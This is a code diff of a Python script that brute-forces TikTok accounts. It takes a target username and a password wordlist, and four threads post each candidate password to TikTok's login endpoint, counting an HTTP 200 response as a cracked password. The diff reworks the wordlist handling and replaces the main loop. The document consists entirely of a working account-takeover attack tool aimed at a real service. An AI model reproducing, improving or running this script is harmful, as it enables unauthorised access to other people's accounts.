@@ -48,10 +48,7 @@ user = input(yellow + " > user: " + reset)
 print()
 
 print(blue + "> IT MUST BE IN THIS DIRECTORY OR USE THE DEFAULT 'wordlist.txt'")
-wordlist_filename = input(yellow + " > wordlist: " + reset)
-
-with open(wordlist_filename, 'r') as wordlist_file:
-    current_wordlist = wordlist_file.readline().strip()
+wordlist_filename = input(yellow + " > wordlist filename: " + reset)
 
 print()
 
@@ -69,10 +66,10 @@ password = None
 
 progress_interval = 500  # Adjust this interval based on your preference
 
-def brute_force_worker(user, current_wordlist, start_point, index):
+def brute_force_worker(user, wordlist_filename, start_point, index):
     global password
 
-    with open(current_wordlist, 'r') as f:
+    with open(wordlist_filename, 'r') as f:
         words = f.readlines()[start_point:]
 
     for i, word in enumerate(words):
@@ -82,34 +79,34 @@ def brute_force_worker(user, current_wordlist, start_point, index):
                 print(adv, f"Thread {index} cracking account...", f"{i + 1}/{len(words)}", reset)
             try:
                 response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
-                   "username": user,
-                   "password": word,
-                   "mix_mode": True,
-                   "captcha": "",
-                   "email": "",
-                   "mobile": "",
-                   "account": "",
-                   "type": 1,
-                   "app_id": 1233,
-                   "device_id": "",
-                   "iid": "",
-                   "os_version": "",
-                   "channel": "",
-                   "device_platform": "",
-                   "request_id": "",
-                   "captcha_app": "",
-                   "captcha_type": "",
-                   "google_account": "",
-                   "google_captcha": "",
-                   "google_token": "",
-                   "fb_account": "",
-                   "fb_code": "",
-                   "fb_token": "",
-                   "apple_id": "",
-                   "apple_token": "",
-                   "apple_email": "",
-                   "apple_code": "",
-                   "mix_string": word
+                  "username": user,
+                  "password": word,
+                  "mix_mode": True,
+                  "captcha": "",
+                  "email": "",
+                  "mobile": "",
+                  "account": "",
+                  "type": 1,
+                  "app_id": 1233,
+                  "device_id": "",
+                  "iid": "",
+                  "os_version": "",
+                  "channel": "",
+                  "device_platform": "",
+                  "request_id": "",
+                  "captcha_app": "",
+                  "captcha_type": "",
+                  "google_account": "",
+                  "google_captcha": "",
+                  "google_token": "",
+                  "fb_account": "",
+                  "fb_code": "",
+                  "fb_token": "",
+                  "apple_id": "",
+                  "apple_token": "",
+                  "apple_email": "",
+                  "apple_code": "",
+                  "mix_string": word
                 })
                 if response.status_code == 200:
                     password = word
@@ -121,33 +118,26 @@ def brute_force_worker(user, current_wordlist, start_point, index):
                 print(red + f"Error: {e}. Pausing for user input..." + reset)
                 input("Press Enter to resume...")
 
-def brute_force_parallel(user, current_wordlist, start_point, num_threads=4):
+def brute_force_parallel(user, wordlist_filename, start_point, num_threads=4):
     global password
 
     call(["clear"])
 
     threads = []
     for i in range(num_threads):
-        thread = threading.Thread(target=brute_force_worker, args=(user, current_wordlist, start_point, i))
+        thread = threading.Thread(target=brute_force_worker, args=(user, wordlist_filename, start_point, i))
         threads.append(thread)
         thread.start()
 
     for thread in threads:
         thread.join()
 
-def main():
-    global password
-    global current_wordlist
+user, password, wordlist_filename, start_point = input(yellow + " > user: " + reset), None, input(yellow + " > wordlist filename: " + reset), input(blue + " > Enter the starting point in the wordlist (e.g., 0 for the beginning): " + reset)
 
-    while current_wordlist:
-        brute_force_parallel(user, current_wordlist, start_point)
-        if password:
-            break
+try:
+    start_point = int(start_point)
+except ValueError:
+    print(red + "Invalid input. Defaulting to the beginning of the wordlist." + reset)
+    start_point = 0
 
-        with open(wordlist_filename, 'r') as wordlist_file:
-            current_wordlist = wordlist_file.readline().strip()
-
-        start_point = 0  # Reset the starting point for each new wordlist
-
-if __name__ == "__main__":
-    main()
+brute_force_parallel(user, wordlist_filename, start_point)
